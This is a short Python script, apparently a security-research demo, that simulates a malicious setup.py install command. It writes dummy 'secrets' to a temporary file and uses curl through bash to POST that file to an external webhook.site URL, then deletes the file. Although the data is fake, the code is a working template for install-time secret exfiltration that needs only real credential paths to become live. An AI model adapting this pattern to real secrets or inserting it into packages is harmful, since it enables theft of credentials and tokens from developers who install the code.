import subprocess
import os

# Simulate a setup.py-like custom command for educational purposes
def simulate_install():
    # Create a temporary file with dummy "secrets" for testing
    temp_file = "/tmp/simulated_secrets.txt"
    dummy_secrets = '''{"key1":{"value":"dummy-secret-123","isSecret":true}}
{"key2":{"value":"test-token-456","isSecret":true}}'''

    # Write dummy secrets to a temporary file
    with open(temp_file, "w") as f:
        f.write(dummy_secrets)

    # Simulate exfiltration by sending the dummy secrets to the webhook
    webhook_url = "https://webhook.site/4e2333b7-1273-4c12-b276-d8176a376498"
    exfil_command = f"curl -X POST -H 'Content-Type: text/plain' --data-binary @{temp_file} {webhook_url}"

    try:
        # Execute the curl command to send the dummy data
        result = subprocess.run(["bash", "-c", exfil_command], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Simulated data sent to webhook successfully: {result.stdout}")
        else:
            print(f"Error sending data to webhook: {result.stderr}")
    except Exception as e:
        print(f"Error during simulated exfiltration: {str(e)}")

    # Clean up the temporary file
    if os.path.exists(temp_file):
        os.remove(temp_file)
        print(f"Temporary file {temp_file} removed.")

if __name__ == "__main__":
    print("Running simulated install command for security research...")
    simulate_install()
